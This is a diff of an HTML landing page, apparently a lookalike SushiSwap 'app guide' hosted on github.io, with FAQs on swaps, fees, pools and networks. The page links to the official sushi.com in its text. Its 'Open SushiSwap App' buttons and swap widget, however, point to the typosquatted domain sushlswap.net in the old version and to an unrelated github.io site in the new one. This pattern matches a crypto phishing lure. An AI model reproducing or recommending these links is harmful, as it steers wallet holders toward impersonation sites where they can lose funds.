@@ -1,296 +1,47 @@
-<!DOCTYPE html>
-<html dir="ltr" lang="en"><head>
-<meta charset="utf-8"/><meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
-<title>SushiSwap App — DeFi DEX</title>
-<meta content="SushiSwap App is a non-custodial DeFi DEX. Open the app and swap tokens from your own wallet." name="description"/>
-<meta content="index,follow,max-image-preview:large" name="robots"/>
-<link href="https://sushi-swap-app.github.io/" rel="canonical"/>
-<link href="https://sushi-swap-app.github.io/" hreflang="en" rel="alternate"/><link href="https://sushi-swap-app.github.io/" hreflang="x-default" rel="alternate"/>
-<meta content="#0F080A" name="theme-color"/>
-<meta content="website" property="og:type"/><meta content="SushiSwap App — DeFi DEX" property="og:title"/><meta content="SushiSwap App is a non-custodial DeFi DEX. Open the app and swap tokens from your own wallet." property="og:description"/>
-<meta content="https://sushi-swap-app.github.io/" property="og:url"/><meta content="https://sushi-swap-app.github.io/og-cover.png" property="og:image"/><meta content="en" property="og:locale"/>
-<meta content="summary_large_image" name="twitter:card"/><meta content="SushiSwap App — DeFi DEX" name="twitter:title"/><meta content="SushiSwap App is a non-custodial DeFi DEX. Open the app and swap tokens from your own wallet." name="twitter:description"/><meta content="https://sushi-swap-app.github.io/og-cover.png" name="twitter:image"/>
-<link href="favicon.svg" rel="icon" type="image/svg+xml"/><link href="site.webmanifest" rel="manifest"/><link href="static/icon-180.png" rel="apple-touch-icon"/>
-<link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&amp;family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
-<link href="static/style.css" rel="stylesheet"/>
-<script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@graph": [
-    {
-      "@type": "WebSite",
-      "@id": "https://sushi-swap-app.github.io/#website",
-      "url": "https://sushi-swap-app.github.io/",
-      "name": "SushiSwap App"
-    },
-    {
-      "@type": "WebPage",
-      "@id": "https://sushi-swap-app.github.io/#webpage",
-      "url": "https://sushi-swap-app.github.io/",
-      "name": "SushiSwap App — DeFi DEX",
-      "description": "SushiSwap App is a non-custodial DeFi DEX. Open the app and swap tokens from your own wallet.",
-      "inLanguage": "en",
-      "isPartOf": {
-        "@id": "https://sushi-swap-app.github.io/#website"
-      }
-    },
-    {
-      "@type": "Organization",
-      "@id": "https://sushi-swap-app.github.io/#org",
-      "name": "SushiSwap App",
-      "url": "https://sushi-swap-app.github.io/",
-      "logo": "https://sushi-swap-app.github.io/og-cover.png"
-    },
-    {
-      "@type": "WebApplication",
-      "@id": "https://sushi-swap-app.github.io/#app",
-      "name": "SushiSwap App",
-      "url": "https://sushi-swap-app.github.io/",
-      "applicationCategory": "FinanceApplication",
-      "operatingSystem": "Web",
-      "browserRequirements": "Requires JavaScript",
-      "description": "SushiSwap App is a non-custodial DeFi DEX. Open the app and swap tokens from your own wallet.",
-      "featureList": [
-        "DeFi DEX",
-        "Swap tokens, from your wallet"
-      ],
-      "isPartOf": {
-        "@id": "https://sushi-swap-app.github.io/#website"
-      }
-    },
-    {
-      "@type": "FAQPage",
-      "@id": "https://sushi-swap-app.github.io/#faq",
-      "inLanguage": "en",
-      "mainEntity": [
-        {
-          "@type": "Question",
-          "name": "What is the official SushiSwap app URL?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Sushi lists the official swap page as https://www.sushi.com/swap, with cross-chain swaps at https://www.sushi.com/swap/cross-chain. This guide is independent and does not connect to wallets."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What can I do in the SushiSwap app?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "You can swap tokens, access cross-chain swaps, view or manage pools and use order tools where supported. Sushi describes itself as a multi-chain DEX in its official Sushi overview."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Which chains does SushiSwap support?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Sushi supports many chains, but support can differ by product, route and asset. Use the official Sushi chain FAQ for the current network list, then confirm the selected chain inside the app before signing."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What fees should I check before swapping?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Check fee components: network gas, pool or trading fee, route costs, price impact, slippage effects and any cross-chain or app fee component. Sushi's trading fee FAQ is the current reference for Sushi fee structure."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Can the SushiSwap app bridge tokens?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "SushiXSwap supports cross-chain swaps for selected networks and routes, but it is not the same risk profile as a same-chain swap. The official SushiXSwap FAQ explains supported networks, routing and provider selection."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Is SushiSwap app safe to use?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "No DeFi app removes risk. You still face wallet compromise, phishing, bad token contracts, smart-contract bugs, failed transactions, bridge risk and unfavorable execution. Start with the official domain, review approvals and use wallet hygiene from resources like ethereum.org."
-          }
-        }
-      ]
-    }
-  ]
-}</script></head>
-<body>
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>SushiSwap App - Swap, Pool and Cross-Chain Guide</title><meta name="description" content="SushiSwap app guide: official links, swap flow, supported networks, fees, slippage, pools, limit orders and cross-chain trade risks.">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<link rel="canonical" href="https://sushi-swap-app.github.io/"><meta name="theme-color" content="#FFFFFF">
+<meta property="og:type" content="website"><meta property="og:title" content="SushiSwap App - Swap, Pool and Cross-Chain Guide"><meta property="og:description" content="SushiSwap app guide: official links, swap flow, supported networks, fees, slippage, pools, limit orders and cross-chain trade risks.">
+<meta property="og:url" content="https://sushi-swap-app.github.io/"><meta property="og:image" content="https://sushi-swap-app.github.io/og-cover.png"><meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="SushiSwap App - Swap, Pool and Cross-Chain Guide"><meta name="twitter:description" content="SushiSwap app guide: official links, swap flow, supported networks, fees, slippage, pools, limit orders and cross-chain trade risks."><meta name="twitter:image" content="https://sushi-swap-app.github.io/og-cover.png">
+<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
+<link rel="stylesheet" href="static/style.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://sushi-swap-app.github.io/#website", "url": "https://sushi-swap-app.github.io/", "name": "SushiSwap App"}, {"@type": "WebPage", "@id": "https://sushi-swap-app.github.io/#webpage", "url": "https://sushi-swap-app.github.io/", "name": "SushiSwap App - Swap, Pool and Cross-Chain Guide", "description": "SushiSwap app guide: official links, swap flow, supported networks, fees, slippage, pools, limit orders and cross-chain trade risks.", "inLanguage": "en", "isPartOf": {"@id": "https://sushi-swap-app.github.io/#website"}}, {"@type": "Organization", "@id": "https://sushi-swap-app.github.io/#org", "name": "SushiSwap App", "url": "https://sushi-swap-app.github.io/", "logo": "https://sushi-swap-app.github.io/og-cover.png", "sameAs": ["https://x.com/SushiSwap", "https://github.com/sushi-labs", "https://www.coingecko.com/en/coins/sushi", "https://defillama.com/protocol/sushiswap"]}, {"@type": "WebApplication", "@id": "https://sushi-swap-app.github.io/#app", "name": "SushiSwap App", "url": "https://sushi-swap-app.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "SushiSwap app guide: official links, swap flow, supported networks, fees, slippage, pools, limit orders and cross-chain trade risks.", "featureList": ["Swap", "SushiSwap App", "Non-custodial"], "isPartOf": {"@id": "https://sushi-swap-app.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://sushi-swap-app.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is the SushiSwap app?", "acceptedAnswer": {"@type": "Answer", "text": "The SushiSwap app is the user-facing Sushi decentralized exchange interface for token swaps and liquidity actions. Users connect a wallet, choose a network, approve tokens, and trade through smart contracts rather than depositing funds into a centralized exchange account."}}, {"@type": "Question", "name": "What is SUSHI token?", "acceptedAnswer": {"@type": "Answer", "text": "SUSHI is the token associated with the Sushi ecosystem. It is listed on major market data sites and has been used for governance and protocol incentive structures. It is separate from the act of swapping tokens in the Sushi app, although the app and token share the same brand."}}, {"@type": "Question", "name": "Is SushiSwap non-custodial?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, SushiSwap is designed as a non-custodial DEX. Users keep assets in their wallets and interact with smart contracts for approvals, swaps, and liquidity deposits. Non-custodial does not mean risk-free; smart contracts, approvals, fake tokens, bridges, and volatile liquidity pools can still create losses."}}, {"@type": "Question", "name": "Which chains does SushiSwap support?", "acceptedAnswer": {"@type": "Answer", "text": "Sushi operates across multiple ecosystems. CoinGecko lists SUSHI across Ethereum, BNB Chain, Solana, Base, Polygon, Arbitrum, Avalanche, Fantom, Celo, Near, Harmony, and others. The live app may expose a different set of routes at any moment, so users should verify chain support in the interface."}}, {"@type": "Question", "name": "Why is my SushiSwap quote different from another DEX?", "acceptedAnswer": {"@type": "Answer", "text": "Quotes differ because each DEX has different liquidity, pool fees, routing, gas costs, and price impact. A token pair can be deep on one venue and thin on another. Users should compare minimum received, price impact, and total transaction cost instead of looking only at the headline exchange rate."}}, {"@type": "Question", "name": "Can I earn yield on SushiSwap?", "acceptedAnswer": {"@type": "Answer", "text": "Users can earn potential returns by providing liquidity to Sushi pools, and some pools may have incentives depending on chain and program status. Returns are not guaranteed. Liquidity providers face impermanent loss, token price volatility, changing volume, smart contract risk, and possible incentive changes."}}]}]}</script>
+</head><body>
 <header class="site-header">
-<a aria-label="SushiSwap App" class="brand" href="#top">
-<svg aria-hidden="true" class="brand-mark" viewbox="0 0 32 32"><defs><lineargradient id="g" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="#FBCFDC"></stop><stop offset=".5" stop-color="#F390AD"></stop><stop offset="1" stop-color="#E82E65"></stop></lineargradient></defs><g fill="none" stroke="url(#g)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.4"><circle cx="13" cy="13" r="6.2"></circle><circle cx="20" cy="20" r="6.2"></circle></g></svg>
-<h1>SushiSwap App</h1>
-</a>
-<nav aria-label="Primary" class="site-nav"><ul class="nav-list"><li><a href="#how-it-works">How it works</a></li><li><a href="#fees-security">Fees security</a></li><li><a href="#app-surfaces">App surfaces</a></li><li><a href="#product-surfaces">Product surfaces</a></li><li><a href="#common-networks">Common networks</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-<span class="header-spacer"></span>
-<a class="cta cta-primary header-cta" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open SushiSwap App</a>
-<button aria-expanded="false" aria-label="Menu" class="nav-toggle"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"></path></svg></button>
+  <a class="brand" href="#top" aria-label="SushiSwap App"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">SushiSwap App</span></a>
+  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
+  <span class="header-spacer"></span>
+  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
+  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
 </header>
 <main id="top">
-<section class="hero"><div class="container"><div class="hero-grid">
-<div class="hero-copy">
-<h2 class="hero-title">Swap tokens, from your wallet</h2>
-<p class="lead"><strong>SushiSwap App</strong> — Use SushiSwap for token swaps, pools and cross-chain routes while checking fees, slippage and contract risk before signing.</p>
-<div class="hero-cta-row"><a class="cta cta-primary" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open SushiSwap App ↗</a><a class="cta cta-secondary" href="#what-is">Learn more</a></div>
-<p class="hero-note">Live preview — open SushiSwap App to swap.</p><div class="trust-row"><span class="trust-chip">On-chain</span><span class="trust-chip">Non-custodial</span></div>
-</div>
-<div class="hero-widget">
-<div aria-hidden="true" class="floating-coins"></div>
-<div class="swap-widget" id="app-widget">
-<div class="swap-widget-head"><span>Swap</span><span class="badge">DEX</span></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">From</span><span class="swap-amount">1.00</span></div><span class="token-chip" data-slot="from"><span class="token-icon-morph"><img alt="ETH" class="" decoding="async" height="28" loading="lazy" src="eth.png" width="28"/></span><span class="token-ticker">ETH</span></span></div>
-<div class="swap-flip-wrap"><button aria-label="Switch" class="swap-flip" type="button"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24"><path d="M7 4v16M7 20l-3-3M7 4l3 3M17 20V4M17 4l3 3M17 20l-3-3"></path></svg></button></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">To</span><span class="swap-amount">~1.00</span></div><span class="token-chip" data-slot="to"><span class="token-icon-morph"><img alt="SUSHI" class="" decoding="async" height="28" loading="lazy" src="sushi.png" width="28"/></span><span class="token-ticker">SUSHI</span></span></div>
-<a class="cta cta-primary swap-now-main" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open SushiSwap App ↗</a>
-<p class="swap-note">Preview — open SushiSwap App to swap.</p>
-</div>
-</div>
-</div></div></section>
-<section class="section section-alt" id="what-is"><div class="container"><h2>What is SushiSwap App?</h2><div class="capsule"><p>The SushiSwap app is the trading interface for Sushi, a multi-chain decentralized exchange where users can swap tokens, manage liquidity positions and access cross-chain swaps from a self-custody wallet. The official swap page is <a href="https://www.sushi.com/swap" rel="noopener noreferrer">sushi.com/swap</a>.</p></div></div></section>
-<section class="section section-alt" id="how-it-works">
-<div class="container"><h2>How SushiSwap App works</h2><p class="section-intro">SushiSwap app quotes are built around the selected chain, token pair, available liquidity and route. Your wallet remains the place where approvals and final transaction signatures happen.</p>
-<ol class="steps"><li><strong>Start from the official domain</strong><span>Use the official Sushi links, confirm the network shown in the app and avoid copied domains from ads, DMs or lookalike search results.</span></li><li><strong>Choose tokens and chain</strong><span>Pick the source asset, destination asset and network. For unfamiliar tokens, verify the token contract before trusting the symbol.</span></li><li><strong>Review route details</strong><span>Check estimated received amount, minimum received, price impact, slippage settings, route, network fee and any product-specific fee component.</span></li><li><strong>Approve and sign</strong><span>First-time ERC-20 trades may require an approval. The swap settles only after your wallet signs and the transaction confirms on-chain.</span></li></ol>
-</div>
-</section>
-<section class="section" id="fees-security">
-<div class="container"><h2>Fees and security</h2><p class="section-intro">Costs vary by pool version, route, chain congestion and whether the trade stays on one chain or crosses chains.</p>
-<div class="cards three"><article class="card"><h3>Fee components</h3><p>Expect network gas, pool or trading fees, price impact, slippage effects and any app or cross-chain route fee. Sushi's <a href="https://www.sushi.com/faq/product/swap/how-much-are-the-trading-fees-on-sushi" rel="noopener noreferrer">fee FAQ</a> is the authority for current fee structure.</p></article><article class="card"><h3>Slippage and price impact</h3><p>A quoted swap can execute at a different final amount if liquidity or market conditions move before confirmation. Sushi's <a href="https://www.sushi.com/faq/product/swap/what-is-slippage" rel="noopener noreferrer">slippage guide</a> explains why minimum received matters.</p></article><article class="card"><h3>Self-custody risk</h3><p>SushiSwap app does not behave like a centralized exchange account. Wallet security, token approvals, smart-contract risk and phishing checks remain your responsibility; Ethereum's <a href="https://ethereum.org/en/wallets/" rel="noopener noreferrer">wallet guide</a> covers the custody basics.</p></article></div>
-</div>
-</section>
-<section class="section section-alt" id="app-surfaces">
-<div class="container"><h2>Main app surfaces</h2><p class="section-intro">The app is broader than a simple market swap box. The most relevant surfaces are swap, cross-chain swap, pools and order tools.</p>
-<div class="cards three"><article class="card"><h3>Same-chain swaps</h3><p>For a normal swap, choose a pair on one network, review the quote and confirm in your wallet. Sushi's <a href="https://www.sushi.com/faq/product/swap/how-to-make-a-swap" rel="noopener noreferrer">swap guide</a> outlines the basic flow.</p></article><article class="card"><h3>Cross-chain swaps</h3><p>SushiXSwap combines source-chain and destination-chain routing in one UI, adding bridge/provider dependencies to the trade. The <a href="https://www.sushi.com/faq/product/SushiXSwap/sushixswap-faq" rel="noopener noreferrer">SushiXSwap FAQ</a> lists supported networks and route behavior.</p></article><article class="card"><h3>Limit and DCA orders</h3><p>Limit orders and DCA orders can automate parts of execution, but fills and availability depend on product rules, supported networks and market conditions. Sushi documents <a href="https://www.sushi.com/faq/product/swap/faq-limit-order" rel="noopener noreferrer">limit orders</a> separately.</p></article></div>
-</div>
-</section>
-<section class="section" id="product-surfaces">
-<div class="container">
-<h2>SushiSwap App Surfaces</h2>
-<p class="section-intro">These are the main areas a user is likely to touch inside the SushiSwap app.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">SWAP</span>
-<div><h3>Swap</h3><p class="coin-sub">Same-chain token trades <span class="tag">Core</span></p></div>
-</div>
-<p class="coin-intent">Use Swap for direct token trades on a selected network. Check the token contract, route, price impact and minimum received before signing.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="SWAP" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">XSWAP</span>
-<div><h3>SushiXSwap</h3><p class="coin-sub">Cross-chain swap flow <span class="tag">Bridge</span></p></div>
-</div>
-<p class="coin-intent">Use XSwap when the source and destination assets are on different networks. Bridge/provider risk and destination-chain details matter more here.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="XSWAP" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">POOL</span>
-<div><h3>Pools</h3><p class="coin-sub">Liquidity positions <span class="tag">LP</span></p></div>
-</div>
-<p class="coin-intent">Pools are for providing paired assets into Sushi liquidity markets. Fee income, impermanent loss and withdrawal conditions should be reviewed before depositing.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="POOL" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">LIMIT</span>
-<div><h3>Limit Orders</h3><p class="coin-sub">Target-price orders <span class="tag">Order</span></p></div>
-</div>
-<p class="coin-intent">Limit orders let you set a price and wait for a fill. They may remain open, expire or need cancellation depending on market movement.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="LIMIT" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">DCA</span>
-<div><h3>DCA Orders</h3><p class="coin-sub">Scheduled execution <span class="tag">Order</span></p></div>
-</div>
-<p class="coin-intent">DCA orders split an intended trade into scheduled executions. Review frequency, duration, token pair and order-cancellation rules before placing one.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="DCA" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">DOCS</span>
-<div><h3>Docs</h3><p class="coin-sub">Developer reference <span class="tag">Info</span></p></div>
-</div>
-<p class="coin-intent">Sushi docs are useful for protocol references and integration context. They are not a substitute for checking the final wallet transaction.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="DOCS" href="https://docs.sushi.com/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section section-alt" id="common-networks">
-<div class="container">
-<h2>Common Sushi Networks</h2>
-<p class="section-intro">Sushi lists many supported networks, but exact product availability can vary by chain, token and route.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><img alt="ETH" class="coin-icon" decoding="async" height="40" loading="lazy" src="eth.png" width="40"/>
-<div><h3>Ethereum</h3><p class="coin-sub">Mainnet liquidity <span class="tag">L1</span></p></div>
-</div>
-<p class="coin-intent">Ethereum is a primary venue for blue-chip liquidity and higher gas sensitivity. Larger trades still need route and price-impact review.</p>
-<a class="cta cta-mini swap-now" data-icon="eth.png" data-ticker="ETH" href="https://ethereum.org/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="ARB" class="coin-icon" decoding="async" height="40" loading="lazy" src="arb.png" width="40"/>
-<div><h3>Arbitrum One</h3><p class="coin-sub">Optimistic rollup <span class="tag">L2</span></p></div>
-</div>
-<p class="coin-intent">Arbitrum offers broad DeFi liquidity with lower network costs than mainnet. Confirm whether a token is native, bridged or wrapped.</p>
-<a class="cta cta-mini swap-now" data-icon="arb.png" data-ticker="ARB" href="https://arbitrum.io/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">BASE</span>
-<div><h3>Base</h3><p class="coin-sub">Coinbase-incubated L2 <span class="tag">L2</span></p></div>
-</div>
-<p class="coin-intent">Base is a common app chain for newer assets and lower-cost swaps. Thin liquidity can still create meaningful price impact.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="BASE" href="https://base.org/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="POL" class="coin-icon" decoding="async" height="40" loading="lazy" src="pol.png" width="40"/>
-<div><h3>Polygon</h3><p class="coin-sub">EVM scaling network <span class="tag">EVM</span></p></div>
-</div>
-<p class="coin-intent">Polygon supports EVM-style wallet flows and many bridged assets. Verify the exact token version before trading.</p>
-<a class="cta cta-mini swap-now" data-icon="pol.png" data-ticker="POL" href="https://polygon.technology/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">BSC</span>
-<div><h3>BNB Smart Chain</h3><p class="coin-sub">EVM-compatible chain <span class="tag">EVM</span></p></div>
-</div>
-<p class="coin-intent">BNB Smart Chain expands access to BSC-native markets. Token impersonation checks are especially important on crowded token lists.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="BSC" href="https://www.bnbchain.org/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="AVAX" class="coin-icon" decoding="async" height="40" loading="lazy" src="avax.png" width="40"/>
-<div><h3>Avalanche C-Chain</h3><p class="coin-sub">Avalanche EVM chain <span class="tag">EVM</span></p></div>
-</div>
-<p class="coin-intent">Avalanche C-Chain routes can suit assets native to that ecosystem. Check bridge provenance when a token exists on several networks.</p>
-<a class="cta cta-mini swap-now" data-icon="avax.png" data-ticker="AVAX" href="https://www.avax.network/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="OP" class="coin-icon" decoding="async" height="40" loading="lazy" src="op.png" width="40"/>
-<div><h3>OP Mainnet</h3><p class="coin-sub">Optimism network <span class="tag">L2</span></p></div>
-</div>
-<p class="coin-intent">OP Mainnet gives Sushi users another lower-cost EVM venue. Make sure the wallet is on the intended chain before approval.</p>
-<a class="cta cta-mini swap-now" data-icon="op.png" data-ticker="OP" href="https://www.optimism.io/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">CHAINS</span>
-<div><h3>Sushi Chain List</h3><p class="coin-sub">Official Sushi network list <span class="tag">List</span></p></div>
-</div>
-<p class="coin-intent">Use Sushi's chain FAQ to confirm the broad support list. Product-level routing can still differ from the headline network list.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="CHAINS" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section" id="compare"><div class="container"><h2>Same-Chain vs Cross-Chain</h2><p class="section-intro">Sushi supports regular swaps and SushiXSwap. The <a href="https://www.sushi.com/faq/product/SushiXSwap/sushixswap-faq" rel="noopener noreferrer">SushiXSwap FAQ</a> explains how cross-chain routes add bridge and provider selection to the normal swap review.</p>
-<div class="table-wrap"><table class="compare-table"><thead><tr><th>Area</th><th>Same-chain swap</th><th>Cross-chain swap</th></tr></thead><tbody><tr><td>Network scope</td><td>Input and output settle on one chain.</td><td>Input and output settle across different chains.</td></tr><tr><td>Cost checks</td><td>Network gas, trading fee, price impact and slippage.</td><td>Source-chain gas, destination outcome, bridge/provider costs and app fee components.</td></tr><tr><td>Risk model</td><td>AMM, token, wallet approval and smart-contract risk.</td><td>All swap risks plus bridge, relayer, provider and destination-chain risk.</td></tr><tr><td>Review focus</td><td>Minimum received, route and token contract.</td><td>Route provider, destination asset, chain selection and final received amount.</td></tr></tbody></table></div></div></section>
-<section class="section" id="faq"><div class="container"><h2>SushiSwap App FAQ</h2><div class="faq-list">
-<details open=""><summary><h3>What is the official SushiSwap app URL?</h3></summary><div>Sushi lists the official swap page as <a href="https://www.sushi.com/swap" rel="noopener noreferrer">https://www.sushi.com/swap</a>, with cross-chain swaps at <a href="https://www.sushi.com/swap/cross-chain" rel="noopener noreferrer">https://www.sushi.com/swap/cross-chain</a>. This guide is independent and does not connect to wallets.</div></details>
-<details open=""><summary><h3>What can I do in the SushiSwap App?</h3></summary><div>You can swap tokens, access cross-chain swaps, view or manage pools and use order tools where supported. Sushi describes itself as a multi-chain DEX in its <a href="https://www.sushi.com/faq/general/about-sushi/what-is-sushi" rel="noopener noreferrer">official Sushi overview</a>.</div></details>
-<details><summary><h3>Which chains does SushiSwap support?</h3></summary><div>Sushi supports many chains, but support can differ by product, route and asset. Use the official <a href="https://www.sushi.com/faq/general/about-sushi/which-chains-are-sushi-on" rel="noopener noreferrer">Sushi chain FAQ</a> for the current network list, then confirm the selected chain inside the app before signing.</div></details>
-<details><summary><h3>What fees should I check before swapping?</h3></summary><div>Check fee components: network gas, pool or trading fee, route costs, price impact, slippage effects and any cross-chain or app fee component. Sushi's <a href="https://www.sushi.com/faq/product/swap/how-much-are-the-trading-fees-on-sushi" rel="noopener noreferrer">trading fee FAQ</a> is the current reference for Sushi fee structure.</div></details>
-<details><summary><h3>Can the SushiSwap App bridge tokens?</h3></summary><div>SushiXSwap supports cross-chain swaps for selected networks and routes, but it is not the same risk profile as a same-chain swap. The official <a href="https://www.sushi.com/faq/product/SushiXSwap/sushixswap-faq" rel="noopener noreferrer">SushiXSwap FAQ</a> explains supported networks, routing and provider selection.</div></details>
-<details><summary><h3>Is SushiSwap App safe to use?</h3></summary><div>No DeFi app removes risk. You still face wallet compromise, phishing, bad token contracts, smart-contract bugs, failed transactions, bridge risk and unfavorable execution. Start with the official domain, review approvals and use wallet hygiene from resources like <a href="https://ethereum.org/en/wallets/" rel="noopener noreferrer">ethereum.org</a>.</div></details>
-</div></div></section>
+  <section class="hero">
+    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
+    <div class="container">
+      <h1>SushiSwap App</h1>
+      <div class="bridge-widget" role="group" aria-label=" preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · </span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/sushi.png" alt="SUSHI" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>SUSHI</b> · </span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
+      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open SushiSwap App ↗</a></div>
+      <p class="hero-note">Live preview — open the official SushiSwap App app from your own wallet.</p>
+      <div class="trust-row"></div>
+    </div>
+  </section>
